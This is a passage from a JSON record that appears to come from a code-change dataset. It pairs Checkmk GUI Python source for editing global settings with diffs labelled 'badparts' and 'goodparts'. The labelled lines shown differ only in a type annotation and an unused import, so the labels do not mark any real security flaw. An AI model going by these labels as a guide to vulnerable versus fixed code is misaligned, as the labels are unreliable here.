None\n                else sorted({*previous_sites, *current_sites})\n            )\n\n            entries[self._ident] = self._entry\n\n            self._add_change(\n                action=\"edit\",\n                text=_(\"Edited the %s '%s'\") % (self._mode_type.name_singular(), self._ident),\n                affected_sites=affected_sites,\n            )\n\n        self._save(entries)\n\n        return redirect(mode_url(self._mode_type.list_mode_name()))\n\n    def _save(self, entries: dict[str, _T]) -> None:\n        self._store.save(entries)\n\n    def page(self) -> None:\n        with html.form_context(\"edit\", method=\"POST\"):\n            html.prevent_password_auto_completion()\n\n            vs = self.valuespec()\n\n            vs.render_input(\"_edit\", dict(self._entry))\n            vs.set_focus(\"_edit\")\n            forms.end()\n\n            html.hidden_fields()\n"
                },
                "/cmk/gui/wato/pages/global_settings.py": {
                    "changes": [
                        {
                            "diff": "\n from cmk.gui.utils.html import HTML\n from cmk.gui.utils.transaction_manager import transactions\n from cmk.gui.utils.urls import makeactionuri, makeuri_contextless\n-from cmk.gui.valuespec import Checkbox, Transform, ValueSpec\n+from cmk.gui.valuespec import Checkbox, Transform\n from cmk.gui.watolib.config_domain_name import (\n     ABCConfigDomain,\n     config_variable_group_registry,\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/cmk/gui/wato/pages/global_settings.py",
                            "badparts": [
                                "from cmk.gui.valuespec import Checkbox, Transform, ValueSpec"
                            ],
                            "goodparts": [
                                "from cmk.gui.valuespec import Checkbox, Transform"
                            ]
                        },
                        {
                            "diff": "\n         return ModeEditGlobals.mode_url()\n \n \n-def is_a_checkbox(vs: ValueSpec) -> bool:\n+def is_a_checkbox(vs) -> bool:  # type: ignore[no-untyped-def]\n     \"\"\"Checks if a valuespec is a Checkbox\"\"\"\n     if isinstance(vs, Checkbox):\n         return Tru",
                            "add": 1,
                            "remove": 1,
                            "filename": "/cmk/gui/wato/pages/global_settings.py",
                            "badparts": [
                                "def is_a_checkbox(vs: ValueSpec) -> bool:"
                            ],
                            "goodparts": [
                                "def is_a_checkbox(vs) -> bool:  # type: ignore[no-untyped-def]"
                            ]
                        }
                    ],
                    "source": "\n \"\"\"Editor for global settings in main.mk and modes for these global settings\"\"\" import abc from collections.abc import Callable, Collection, Iterable, Iterator from typing import Any, Final from cmk.utils.exceptions import MKGeneralException import cmk.gui.forms as forms import cmk.gui.utils.escaping as escaping import cmk.gui.watolib.changes as _changes from cmk.gui.breadcrumb import Breadcrumb from cmk.gui.config import active_config from cmk.gui.exceptions import MKAuthException, MKUserError from cmk.gui.global_config import get_global_config from cmk.gui.htmllib.generator import HTMLWriter from cmk.gui.htmllib.html import html from cmk.gui.http import request from cmk.gui.i18n import _ from cmk.gui.log import logger from cmk.gui.logged_in import user from cmk.gui.page_menu import( get_search_expression, make_confirmed_form_submit_link, make_display_options_dropdown, make_simple_form_page_menu, make_simple_link, PageMenu, PageMenuDropdown, PageMenuEntry, PageMenuSearch, PageMenuTopic, ) from cmk.gui.type_defs import ActionResult, GlobalSettings, PermissionName from cmk.gui.utils.escaping import escape_to_html from cmk.gui.utils.flashed_messages import flash from cmk.gui.utils.html import HTML from cmk.gui.utils.transaction_manager import transactions from cmk.gui.utils.urls import makeactionuri, makeuri_contextless from cmk.gui.valuespec import Checkbox, Transform, ValueSpec from cmk.gui.watolib.config_domain_name import( ABCConfigDomain, config_variable_group_registry, config_variable_registry, ConfigVariable, ConfigVariableGroup, ) from cmk.gui.watolib.config_domains import ConfigDomainCore from cmk.gui.watolib.global_settings import load_configuration_settings, save_global_settings from cmk.gui.watolib.hosts_and_folders import folder_preserving_link from cmk.gui.watolib.mode import mode_url, ModeRegistry, redirect, WatoMode from cmk.gui.watolib.search import( ABCMatchItemGenerator, match_item_generator_registry, MatchItem, MatchItems, ) def register(mode_registry: ModeRegistry) -> None: mode_registry.register(ModeEditGlobals) mode_registry.register(ModeEditGlobalSetting) class ABCGlobalSettingsMode(WatoMode): def __init__(self) -> None: self._search: None | str=None self._show_only_modified=False super().__init__() self._default_values=ABCConfigDomain.get_all_default_globals() self._global_settings: GlobalSettings={} self._current_settings: dict[str, Any]={} def _from_vars(self): self._search=get_search_expression() self._show_only_modified=( request.get_integer_input_mandatory(\"_show_only_modified\", 0)==1 ) @staticmethod def _get_groups(show_all: bool) -> Iterable[ConfigVariableGroup]: groups=[] for group_class in config_variable_group_registry.values(): group=group_class() add=False for config_variable_class in group.config_variables(): config_variable=config_variable_class() if not show_all and( not config_variable.in_global_settings() or not config_variable.domain().in_global_settings ): continue add=True break if add: groups.append(group) return groups def _groups(self) -> Iterable[ConfigVariableGroup]: return self._get_groups(show_all=False) @property def edit_mode_name(self) -> str: return \"edit_configvar\" def _should_show_config_variable(self, config_variable: ConfigVariable) -> bool: varname=config_variable.ident() if not config_variable.domain().enabled(): return False if config_variable.domain()==ConfigDomainCore and varname not in self._default_values: if active_config.debug: raise MKGeneralException( \"The configuration variable <tt>%s</tt> is unknown to \" \"your local Checkmk installation\" % varname ) return False if not config_variable.in_global_settings(): return False return True def _extend_display_dropdown(self, menu: PageMenu) -> None: display_dropdown=menu.get_dropdown_by_name(\"display\", make_display_options_dropdown()) display_dropdown.topics.insert( 0, PageMenuTopic( title=_(\"Details\"), entries=list(self._page_menu_entries_details()), ), ) def _page_menu_entries_details(self) -> Iterator[PageMenuEntry]: yield PageMenuEntry( title=_(\"Show only modified settings\"), icon_name=\"toggle_on\" if self._show_only_modified else \"toggle_off\", item=make_simple_link( makeactionuri( request, transactions, [ (\"_show_only_modified\", \"0\" if self._show_only_modified else \"1\"), ], ) ), ) def iter_all_configuration_variables( self, ) -> Iterable[tuple[ConfigVariableGroup, Iterable[ConfigVariable]]]: yield from( ( group, ( config_variable for config_variable_class in group.config_variables() for config_variable in[config_variable_class()] if self._should_show_config_variable(config_variable) ), ) for group in sorted(self._groups(), key=lambda g: g.sort_index()) ) def _show_configuration_variables(self) -> None: search=self._search at_least_one_painted=False html.open_div(class_=\"globalvars\") global_config=get_global_config() for group, config_variables in self.iter_all_configuration_variables(): header_is_painted=False for config_variable in config_variables: varname=config_variable.ident() valuespec=config_variable.valuespec() if not global_config.global_settings.is_activated(varname): continue if self._show_only_modified and varname not in self._current_settings: continue help_text=valuespec.help() or \"\" title_text=valuespec.title() or \"\" if( search and search not in group.title().lower() and search not in config_variable.domain().ident().lower() and search not in varname and search not in help_text.lower() and search not in title_text.lower() ): continue at_least_one_painted=True if not header_is_painted: forms.header(group.title(), isopen=bool(search) or self._show_only_modified) if warning:=group.warning(): forms.warning_message(warning) header_is_painted=True default_value=self._default_values[varname] edit_url=folder_preserving_link( [ (\"mode\", self.edit_mode_name), (\"varname\", varname), (\"site\", request.var(\"site\", \"\")), ] ) title=HTMLWriter.render_a( title_text, href=edit_url, class_=\"modified\" if varname in self._current_settings else None, title=escaping.strip_tags(help_text), ) if varname in self._current_settings: value=self._current_settings[varname] elif varname in self._global_settings: value=self._global_settings[varname] else: value=default_value try: to_text=valuespec.value_to_html(value) except Exception: logger.exception(\"error converting %r to text\", value) to_text=html.render_error(_(\"Failed to render value: %r\") % value) simple=True if \"\\n\" in to_text or \"<td>\" in to_text: simple=False forms.section(title, simple=simple) if varname in self._current_settings: modified_cls=[\"modified\"] value_title: str | None=_(\"This option has been modified.\") elif varname in self._global_settings: modified_cls=[\"modified globally\"] value_title=_(\"This option has been modified in global settings.\") else: modified_cls=[] value_title=None if is_a_checkbox(valuespec): html.open_div( class_=[\"toggle_switch_container\"] +modified_cls +([\"on\"] if value else[]) ) html.toggle_switch( enabled=value, help_txt=(value_title +\" \" if value_title else \"\") +_(\"Click to toggle this setting\"), href=makeactionuri( request, transactions,[(\"_action\", \"toggle\"),(\"_varname\", varname)] ), class_=[*modified_cls, \"large\"], ) html.close_div() else: html.a(to_text, href=edit_url, class_=modified_cls, title=value_title) if header_is_painted: forms.end() if not at_least_one_painted and search: html.show_message(_(\"Did not find any global setting matching your search.\")) html.close_div() class ABCEditGlobalSettingMode(WatoMode): def _from_vars(self): self._varname=request.get_ascii_input_mandatory(\"varname\") try: self._config_variable=config_variable_registry[self._varname]() self._valuespec=self._config_variable.valuespec() except KeyError: raise MKUserError( \"varname\", _('The global setting \"%s\" does not exist.') % self._varname ) if not self._may_edit_configvar(self._varname): raise MKAuthException(_(\"You are not permitted to edit this global setting.\")) self._current_settings=dict(load_configuration_settings()) self._global_settings: GlobalSettings={} def _may_edit_configvar(self, varname): if not get_global_config().global_settings.is_activated(varname): return False if varname in[\"actions\"]: return user.may(\"wato.add_or_modify_executables\") return True def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu: menu=make_simple_form_page_menu( _(\"Setting\"), breadcrumb, form_name=\"value_editor\", button_name=\"_save\" ) reset_possible=self._config_variable.allow_reset() and self._is_configured() default_values=ABCConfigDomain.get_all_default_globals() defvalue=default_values[self._varname] value=self._current_settings.get( self._varname, self._global_settings.get(self._varname, defvalue) ) menu.dropdowns[0].topics[0].entries.append( PageMenuEntry( title=_(\"Remove explicit setting\") if value==defvalue else _(\"Reset to default\"), icon_name=\"reset\", item=make_confirmed_form_submit_link( form_name=\"value_editor\", button_name=\"_reset\", title=_(\"Reset configuration variable to default value\"), confirm_button=_(\"Reset\"), ), is_enabled=reset_possible, is_shortcut=True, is_suggested=True, ) ) return menu def action(self) -> ActionResult: if request.var(\"_reset\"): if not transactions.check_transaction(): return None try: del self._current_settings[self._varname] except KeyError: pass msg=escape_to_html( _(\"Resetted configuration variable %s to its default.\") % self._varname ) else: new_value=self._valuespec.from_html_vars(\"ve\") self._valuespec.validate_value(new_value, \"ve\") self._current_settings[self._varname]=new_value msg=HTML( _(\"Changed global configuration variable %s to %s.\") %( escaping.escape_attribute(self._varname), self._valuespec.value_to_html(new_value), ) ) self._save() _changes.add_change( \"edit-configvar\", msg, sites=self._affected_sites(), domains=[self._config_variable.domain()], need_restart=self._config_variable.need_restart(), ) return redirect(self._back_url()) @abc.abstractmethod def _back_url(self) -> str: raise NotImplementedError() def _save(self): save_global_settings(self._current_settings) @abc.abstractmethod def _affected_sites(self): raise NotImplementedError() def _is_configured(self) -> bool: return self._varname in self._current_settings def _vue_field_id(self): return \"_vue_global_settings\" def page(self) -> None: is_configured=self._is_configured() is_configured_globally=self._varname in self._global_settings default_values=ABCConfigDomain.get_all_default_globals() defvalue=default_values[self._varname] value=self._current_settings.get( self._varname, self._global_settings.get(self._varname, defvalue) ) hint=self._config_variable.hint() if hint: html.show_warning(hint) with html.form_context(\"value_editor\", method=\"POST\"): title=self._valuespec.title() assert isinstance(title, str) forms.header(title) if not active_config.wato_hide_varnames: forms.section(_(\"Configuration variable:\")) html.tt(self._varname) forms.section(_(\"Current setting\")) self._valuespec.render_input(\"ve\", value) self._valuespec.set_focus(\"ve\") html.help(self._valuespec.help()) if is_configured_globally: self._show_global_setting() forms.section(_(\"Factory setting\")) html.write_text(self._valuespec.value_to_html(defvalue)) forms.section(_(\"Current state\")) if is_configured_globally: html.write_text( _('This variable is configured in <a href=\"%s\">global settings</a>.') %(\"wato.py?mode=edit_configvar&varname=%s\" % self._varname) ) elif not is_configured: html.write_text(_(\"This variable is at factory settings.\")) else: curvalue=self._current_settings[self._varname] if is_configured_globally and curvalue==self._global_settings[self._varname]: html.write_text(_(\"Site setting and global setting are identical.\")) elif curvalue==defvalue: html.write_text(_(\"Your setting and factory settings are identical.\")) else: html.write_text(self._valuespec.value_to_html(curvalue)) forms.end() html.hidden_fields() def _show_global_setting(self): pass class ModeEditGlobals(ABCGlobalSettingsMode): page_menu_dropdowns_hook: Callable[[], PageMenuDropdown] | None=None @classmethod def name(cls) -> str: return \"globalvars\" @staticmethod def static_permissions() -> Collection[PermissionName]: return[\"global\"] def __init__(self) -> None: super().__init__() self._current_settings=dict(load_configuration_settings()) def title(self) -> str: if self._search: return _(\"Global settings matching '%s'\") % escape_to_html(self._search) return _(\"Global settings\") def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu: dropdowns=[] if ModeEditGlobals.page_menu_dropdowns_hook is not None: dropdowns.append(ModeEditGlobals.page_menu_dropdowns_hook()) dropdowns.append( PageMenuDropdown( name=\"related\", title=_(\"Related\"), topics=[ PageMenuTopic( title=_(\"Setup\"), entries=list(self._page_menu_entries_related()), ), ], ), ) menu=PageMenu( dropdowns=dropdowns, breadcrumb=breadcrumb, inpage_search=PageMenuSearch(), ) self._extend_display_dropdown(menu) return menu def _page_menu_entries_related(self) -> Iterator[PageMenuEntry]: yield PageMenuEntry( title=_(\"Sites\"), icon_name=\"sites\", item=make_simple_link(\"wato.py?mode=sites\"), ) def action(self) -> ActionResult: varname=request.var(\"_varname\") if not varname: return None action=request.var(\"_action\") config_variable=config_variable_registry[varname]() def_value=self._default_values[varname] if not transactions.check_transaction(): return None if varname in self._current_settings: self._current_settings[varname]=not self._current_settings[varname] else: self._current_settings[varname]=not def_value msg=_(\"Changed Configuration variable %s to %s.\") %( varname, \"on\" if self._current_settings[varname] else \"off\", ) save_global_settings(self._current_settings) _changes.add_change( \"edit-configvar\", msg, domains=[config_variable.domain()], need_restart=config_variable.need_restart(), ) if action==\"_reset\": flash(msg) return redirect(mode_url(\"globalvars\")) def page(self) -> None: self._show_configuration_variables() class ModeEditGlobalSetting(ABCEditGlobalSettingMode): @classmethod def name(cls) -> str: return \"edit_configvar\" @staticmethod def static_permissions() -> Collection[PermissionName]: return[\"global\"] @classmethod def parent_mode(cls) -> type[WatoMode] | None: return ModeEditGlobals def title(self) -> str: return _(\"Edit global setting\") def _affected_sites(self): return None def _back_url(self) -> str: return ModeEditGlobals.mode_url() def is_a_checkbox(vs: ValueSpec) -> bool: \"\"\"Checks if a valuespec is a Checkbox\"\"\" if isinstance(vs, Checkbox): return True if isinstance(vs, Transform): return is_a_checkbox(vs._valuespec) return False class MatchItemGeneratorSettings(ABCMatchItemGenerator): def __init__( self, name: str, topic: str, mode_class: type[ABCGlobalSettingsMode], ) -> None: super().__init__(name) self._topic: Final[str]=topic self._mode_class: Final[type[ABCGlobalSettingsMode]]=mode_class def _config_variable_to_match_item( self, config_variable: ConfigVariable, edit_mode_name: str, ) -> MatchItem: title=config_variable.valuespec().title() or _(\"Untitled setting\") ident=config_variable.ident() return MatchItem( title=title, topic=self._topic, url=makeuri_contextless( request, [(\"mode\", edit_mode_name),(\"varname\", ident)], filename=\"wato.py\", ), match_texts=[title, ident], ) def generate_match_items(self) -> MatchItems: mode=self._mode_class() yield from( self._config_variable_to_match_item(config_variable, mode.edit_mode_name) for _group, config_variables in mode.iter_all_configuration_variables() for config_variable in config_variables ) @staticmethod def is_affected_by_change(_change_action_name: str) -> bool: return False @property def is_localization_dependent(self) -> bool: return True match_item_generator_registry.register( MatchItemGeneratorSettings( \"global_settings\", _(\"Global settings\"), ModeEditGlobals, ) ) ",
                    "sourceWithComments": "#!/usr/bin/env python3\n# Copyright (C) 2019 Checkmk GmbH - License: GNU General Public License v2\n# This file is part of Checkmk (https://checkmk.com). It is subject to the terms and\n# conditions defined in the file COPYING, which is part of this source code package.\n\n# pylint: disable=protected-access\n\"\"\"Editor for global settings in main.mk and modes for these global\nsettings\"\"\"\n\nimport abc\nfrom collections.abc import Callable, Collection, Iterable, Iterator\nfrom typing import Any, Final\n\nfrom cmk.utils.exceptions import MKGeneralException\n\nimport cmk.gui.forms as forms\nimport cmk.gui.utils.escaping as escaping\nimport cmk.gui.watolib.changes as _changes\nfrom cmk.gui.breadcrumb import Breadcrumb\nfrom cmk.gui.config import active_config\nfrom cmk.gui.exceptions import MKAuthException, MKUserError\nfrom cmk.gui.global_config import get_global_config\nfrom cmk.gui.htmllib.generator import HTMLWriter\nfrom cmk.gui.htmllib.html import html\nfrom cmk.gui.http import request\nfrom cmk.gui.i18n import _\nfrom cmk.gui.log import logger\nfrom cmk.gui.logged_in import user\nfrom cmk.gui.page_menu import (\n    get_search_expression,\n    make_confirmed_form_submit_link,\n    make_display_options_dropdown,\n    make_simple_form_page_menu,\n    make_simple_link,\n    PageMenu,\n    PageMenuDropdown,\n    PageMenuEntry,\n    PageMenuSearch,\n    PageMenuTopic,\n)\nfrom cmk.gui.type_defs import ActionResult, GlobalSettings, PermissionName\nfrom cmk.gui.utils.escaping import escape_to_html\nfrom cmk.gui.utils.flashed_messages import flash\nfrom cmk.gui.utils.html import HTML\nfrom cmk.gui.utils.transaction_manager import transactions\nfrom cmk.gui.utils.urls import makeactionuri, makeuri_contextless\nfrom cmk.gui.valuespec import Checkbox, Transform, ValueSpec\nfrom cmk.gui.watolib.config_domain_name import (\n    ABCConfigDomain,\n    config_variable_group_registry,\n    config_variable_registry,\n    ConfigVariable,\n    ConfigVariableGroup,\n)\nfrom cmk.gui.watolib.config_domains import ConfigDomainCore\nfrom cmk.gui.watolib.global_settings import load_configuration_settings, save_global_settings\nfrom cmk.gui.watolib.hosts_and_folders import folder_preserving_link\nfrom cmk.gui.watolib.mode import mode_url, ModeRegistry, redirect, WatoMode\nfrom cmk.gui.watolib.search import (\n    ABCMatchItemGenerator,\n    match_item_generator_registry,\n    MatchItem,\n    MatchItems,\n)\n\n\ndef register(mode_registry: ModeRegistry) -> None:\n    mode_registry.register(ModeEditGlobals)\n    mode_registry.register(ModeEditGlobalSetting)\n\n\nclass ABCGlobalSettingsMode(WatoMode):\n    def __init__(self) -> None:\n        self._search: None | str = None\n        self._show_only_modified = False\n\n        super().__init__()\n\n        self._default_values = ABCConfigDomain.get_all_default_globals()\n        self._global_settings: GlobalSettings = {}\n        self._current_settings: dict[str, Any] = {}\n\n    def _from_vars(self):\n        self._search = get_search_expression()\n        self._show_only_modified = (\n            request.get_integer_input_mandatory(\"_show_only_modified\", 0) == 1\n        )\n\n    @staticmethod\n    def _get_groups(show_all: bool) -> Iterable[ConfigVariableGroup]:\n        groups = []\n\n        for group_class in config_variable_group_registry.values():\n            group = group_class()\n            add = False\n            for config_variable_class in group.config_variables():\n                config_variable = config_variable_class()\n                if not show_all and (\n                    not config_variable.in_global_settings()\n                    or not config_variable.domain().in_global_settings\n                ):\n                    continue  # do not edit via global settings\n\n                add = True\n                break\n\n            if add:\n                groups.append(group)\n\n        return groups\n\n    def _groups(self) -> Iterable[ConfigVariableGroup]:\n        return self._get_groups(show_all=False)\n\n    @property\n    def edit_mode_name(self) -> str:\n        return \"edit_configvar\"\n\n    def _should_show_config_variable(self, config_variable: ConfigVariable) -> bool:\n        varname = config_variable.ident()\n\n        if not config_variable.domain().enabled():\n            return False\n\n        if config_variable.domain() == ConfigDomainCore and varname not in self._default_values:\n            if active_config.debug:\n                raise MKGeneralException(\n                    \"The configuration variable <tt>%s</tt> is unknown to \"\n                    \"your local Checkmk installation\" % varname\n                )\n            return False\n\n        if not config_variable.in_global_settings():\n            return False\n\n        return True\n\n    def _extend_display_dropdown(self, menu: PageMenu) -> None:\n        display_dropdown = menu.get_dropdown_by_name(\"display\", make_display_options_dropdown())\n        display_dropdown.topics.insert(\n            0,\n            PageMenuTopic(\n                title=_(\"Details\"),\n                entries=list(self._page_menu_entries_details()),\n            ),\n        )\n\n    def _page_menu_entries_details(self) -> Iterator[PageMenuEntry]:\n        yield PageMenuEntry(\n            title=_(\"Show only modified settings\"),\n            icon_name=\"toggle_on\" if self._show_only_modified else \"toggle_off\",\n            item=make_simple_link(\n                makeactionuri(\n                    request,\n                    transactions,\n                    [\n                        (\"_show_only_modified\", \"0\" if self._show_only_modified else \"1\"),\n                    ],\n                )\n            ),\n        )\n\n    def iter_all_configuration_variables(\n        self,\n    ) -> Iterable[tuple[ConfigVariableGroup, Iterable[ConfigVariable]]]:\n        yield from (\n            (\n                group,\n                (\n                    config_variable\n                    for config_variable_class in group.config_variables()\n                    for config_variable in [config_variable_class()]\n                    if self._should_show_config_variable(config_variable)\n                ),\n            )\n            for group in sorted(self._groups(), key=lambda g: g.sort_index())\n        )\n\n    def _show_configuration_variables(self) -> None:  # pylint: disable=too-many-branches\n        search = self._search\n\n        at_least_one_painted = False\n        html.open_div(class_=\"globalvars\")\n        global_config = get_global_config()\n        for group, config_variables in self.iter_all_configuration_variables():\n            header_is_painted = False  # needed for omitting empty groups\n\n            for config_variable in config_variables:\n                varname = config_variable.ident()\n                valuespec = config_variable.valuespec()\n\n                if not global_config.global_settings.is_activated(varname):\n                    continue\n\n                if self._show_only_modified and varname not in self._current_settings:\n                    continue\n\n                help_text = valuespec.help() or \"\"\n                title_text = valuespec.title() or \"\"\n\n                if (\n                    search\n                    and search not in group.title().lower()\n                    and search not in config_variable.domain().ident().lower()\n                    and search not in varname\n                    and search not in help_text.lower()\n                    and search not in title_text.lower()\n                ):\n                    continue  # skip variable when search is performed and nothing matches\n                at_least_one_painted = True\n\n                if not header_is_painted:\n                    # always open headers when searching\n                    forms.header(group.title(), isopen=bool(search) or self._show_only_modified)\n                    if warning := group.warning():\n                        forms.warning_message(warning)\n                    header_is_painted = True\n\n                default_value = self._default_values[varname]\n\n                edit_url = folder_preserving_link(\n                    [\n                        (\"mode\", self.edit_mode_name),\n                        (\"varname\", varname),\n                        (\"site\", request.var(\"site\", \"\")),\n                    ]\n                )\n                title = HTMLWriter.render_a(\n                    title_text,\n                    href=edit_url,\n                    class_=\"modified\" if varname in self._current_settings else None,\n                    title=escaping.strip_tags(help_text),\n                )\n\n                if varname in self._current_settings:\n                    value = self._current_settings[varname]\n                elif varname in self._global_settings:\n                    value = self._global_settings[varname]\n                else:\n                    value = default_value\n\n                try:\n                    to_text = valuespec.value_to_html(value)\n                except Exception:\n                    logger.exception(\"error converting %r to text\", value)\n                    to_text = html.render_error(_(\"Failed to render value: %r\") % value)\n\n                # Is this a simple (single) value or not? change styling in these cases...\n                simple = True\n                if \"\\n\" in to_text or \"<td>\" in to_text:\n                    simple = False\n                forms.section(title, simple=simple)\n\n                if varname in self._current_settings:\n                    modified_cls = [\"modified\"]\n                    value_title: str | None = _(\"This option has been modified.\")\n                elif varname in self._global_settings:\n                    modified_cls = [\"modified globally\"]\n                    value_title = _(\"This option has been modified in global settings.\")\n                else:\n                    modified_cls = []\n                    value_title = None\n\n                if is_a_checkbox(valuespec):\n                    html.open_div(\n                        class_=[\"toggle_switch_container\"]\n                        + modified_cls\n                        + ([\"on\"] if value else [])\n                    )\n                    html.toggle_switch(\n                        enabled=value,\n                        help_txt=(value_title + \" \" if value_title else \"\")\n                        + _(\"Click to toggle this setting\"),\n                        href=makeactionuri(\n                            request, transactions, [(\"_action\", \"toggle\"), (\"_varname\", varname)]\n                        ),\n                        class_=[*modified_cls, \"large\"],\n                    )\n                    html.close_div()\n\n                else:\n                    html.a(to_text, href=edit_url, class_=modified_cls, title=value_title)\n\n            if header_is_painted:\n                forms.end()\n        if not at_least_one_painted and search:\n            html.show_message(_(\"Did not find any global setting matching your search.\"))\n        html.close_div()\n\n\nclass ABCEditGlobalSettingMode(WatoMode):\n    def _from_vars(self):\n        self._varname = request.get_ascii_input_mandatory(\"varname\")\n        try:\n            self._config_variable = config_variable_registry[self._varname]()\n            self._valuespec = self._config_variable.valuespec()\n        except KeyError:\n            raise MKUserError(\n                \"varname\", _('The global setting \"%s\" does not exist.') % self._varname\n            )\n\n        if not self._may_edit_configvar(self._varname):\n            raise MKAuthException(_(\"You are not permitted to edit this global setting.\"))\n\n        self._current_settings = dict(load_configuration_settings())\n        self._global_settings: GlobalSettings = {}\n\n    def _may_edit_configvar(self, varname):\n        if not get_global_config().global_settings.is_activated(varname):\n            return False\n        if varname in [\"actions\"]:\n            return user.may(\"wato.add_or_modify_executables\")\n        return True\n\n    def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu:\n        menu = make_simple_form_page_menu(\n            _(\"Setting\"), breadcrumb, form_name=\"value_editor\", button_name=\"_save\"\n        )\n\n        reset_possible = self._config_variable.allow_reset() and self._is_configured()\n        default_values = ABCConfigDomain.get_all_default_globals()\n        defvalue = default_values[self._varname]\n        value = self._current_settings.get(\n            self._varname, self._global_settings.get(self._varname, defvalue)\n        )\n        menu.dropdowns[0].topics[0].entries.append(\n            PageMenuEntry(\n                title=_(\"Remove explicit setting\") if value == defvalue else _(\"Reset to default\"),\n                icon_name=\"reset\",\n                item=make_confirmed_form_submit_link(\n                    form_name=\"value_editor\",\n                    button_name=\"_reset\",\n                    title=_(\"Reset configuration variable to default value\"),\n                    confirm_button=_(\"Reset\"),\n                ),\n                is_enabled=reset_possible,\n                is_shortcut=True,\n                is_suggested=True,\n            )\n        )\n\n        return menu\n\n    def action(self) -> ActionResult:\n        if request.var(\"_reset\"):\n            if not transactions.check_transaction():\n                return None\n\n            try:\n                del self._current_settings[self._varname]\n            except KeyError:\n                pass\n\n            msg = escape_to_html(\n                _(\"Resetted configuration variable %s to its default.\") % self._varname\n            )\n        else:\n            new_value = self._valuespec.from_html_vars(\"ve\")\n            self._valuespec.validate_value(new_value, \"ve\")\n\n            self._current_settings[self._varname] = new_value\n            msg = HTML(\n                _(\"Changed global configuration variable %s to %s.\")\n                % (\n                    escaping.escape_attribute(self._varname),\n                    self._valuespec.value_to_html(new_value),\n                )\n            )\n\n        self._save()\n        _changes.add_change(\n            \"edit-configvar\",\n            msg,\n            sites=self._affected_sites(),\n            domains=[self._config_variable.domain()],\n            need_restart=self._config_variable.need_restart(),\n        )\n\n        return redirect(self._back_url())\n\n    @abc.abstractmethod\n    def _back_url(self) -> str:\n        raise NotImplementedError()\n\n    def _save(self):\n        save_global_settings(self._current_settings)\n\n    @abc.abstractmethod\n    def _affected_sites(self):\n        raise NotImplementedError()\n\n    def _is_configured(self) -> bool:\n        return self._varname in self._current_settings\n\n    def _vue_field_id(self):\n        # Note: this _underscore is critical because of the hidden vars special behaviour\n        # Non _ vars are always added as hidden vars into a form\n        return \"_vue_global_settings\"\n\n    def page(self) -> None:\n        is_configured = self._is_configured()\n        is_configured_globally = self._varname in self._global_settings\n\n        default_values = ABCConfigDomain.get_all_default_globals()\n\n        defvalue = default_values[self._varname]\n        value = self._current_settings.get(\n            self._varname, self._global_settings.get(self._varname, defvalue)\n        )\n\n        hint = self._config_variable.hint()\n        if hint:\n            html.show_warning(hint)\n\n        with html.form_context(\"value_editor\", method=\"POST\"):\n            title = self._valuespec.title()\n            assert isinstance(title, str)\n            forms.header(title)\n            if not active_config.wato_hide_varnames:\n                forms.section(_(\"Configuration variable:\"))\n                html.tt(self._varname)\n\n            forms.section(_(\"Current setting\"))\n            self._valuespec.render_input(\"ve\", value)\n            self._valuespec.set_focus(\"ve\")\n            html.help(self._valuespec.help())\n\n            if is_configured_globally:\n                self._show_global_setting()\n\n            forms.section(_(\"Factory setting\"))\n            html.write_text(self._valuespec.value_to_html(defvalue))\n\n            forms.section(_(\"Current state\"))\n            if is_configured_globally:\n                html.write_text(\n                    _('This variable is configured in <a href=\"%s\">global settings</a>.')\n                    % (\"wato.py?mode=edit_configvar&varname=%s\" % self._varname)\n                )\n            elif not is_configured:\n                html.write_text(_(\"This variable is at factory settings.\"))\n            else:\n                curvalue = self._current_settings[self._varname]\n                if is_configured_globally and curvalue == self._global_settings[self._varname]:\n                    html.write_text(_(\"Site setting and global setting are identical.\"))\n                elif curvalue == defvalue:\n                    html.write_text(_(\"Your setting and factory settings are identical.\"))\n                else:\n                    html.write_text(self._valuespec.value_to_html(curvalue))\n\n            forms.end()\n            html.hidden_fields()\n\n    def _show_global_setting(self):\n        pass\n\n\nclass ModeEditGlobals(ABCGlobalSettingsMode):\n    page_menu_dropdowns_hook: Callable[[], PageMenuDropdown] | None = None\n\n    @classmethod\n    def name(cls) -> str:\n        return \"globalvars\"\n\n    @staticmethod\n    def static_permissions() -> Collection[PermissionName]:\n        return [\"global\"]\n\n    def __init__(self) -> None:\n        super().__init__()\n        self._current_settings = dict(load_configuration_settings())\n\n    def title(self) -> str:\n        if self._search:\n            return _(\"Global settings matching '%s'\") % escape_to_html(self._search)\n        return _(\"Global settings\")\n\n    def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu:\n        dropdowns = []\n\n        if ModeEditGlobals.page_menu_dropdowns_hook is not None:\n            dropdowns.append(ModeEditGlobals.page_menu_dropdowns_hook())\n\n        dropdowns.append(\n            PageMenuDropdown(\n                name=\"related\",\n                title=_(\"Related\"),\n                topics=[\n                    PageMenuTopic(\n                        title=_(\"Setup\"),\n                        entries=list(self._page_menu_entries_related()),\n                    ),\n                ],\n            ),\n        )\n\n        menu = PageMenu(\n            dropdowns=dropdowns,\n            breadcrumb=breadcrumb,\n            inpage_search=PageMenuSearch(),\n        )\n\n        self._extend_display_dropdown(menu)\n        return menu\n\n    def _page_menu_entries_related(self) -> Iterator[PageMenuEntry]:\n        yield PageMenuEntry(\n            title=_(\"Sites\"),\n            icon_name=\"sites\",\n            item=make_simple_link(\"wato.py?mode=sites\"),\n        )\n\n    def action(self) -> ActionResult:\n        varname = request.var(\"_varname\")\n        if not varname:\n            return None\n\n        action = request.var(\"_action\")\n\n        config_variable = config_variable_registry[varname]()\n        def_value = self._default_values[varname]\n\n        if not transactions.check_transaction():\n            return None\n\n        if varname in self._current_settings:\n            self._current_settings[varname] = not self._current_settings[varname]\n        else:\n            self._current_settings[varname] = not def_value\n        msg = _(\"Changed Configuration variable %s to %s.\") % (\n            varname,\n            \"on\" if self._current_settings[varname] else \"off\",\n        )\n        save_global_settings(self._current_settings)\n\n        _changes.add_change(\n            \"edit-configvar\",\n            msg,\n            domains=[config_variable.domain()],\n            need_restart=config_variable.need_restart(),\n        )\n\n        if action == \"_reset\":\n            flash(msg)\n        return redirect(mode_url(\"globalvars\"))\n\n    def page(self) -> None:\n        self._show_configuration_variables()\n\n\nclass ModeEditGlobalSetting(ABCEditGlobalSettingMode):\n    @classmethod\n    def name(cls) -> str:\n        return \"edit_configvar\"\n\n    @staticmethod\n    def static_permissions() -> Collection[PermissionName]:\n        return [\"global\"]\n\n    @classmethod\n    def parent_mode(cls) 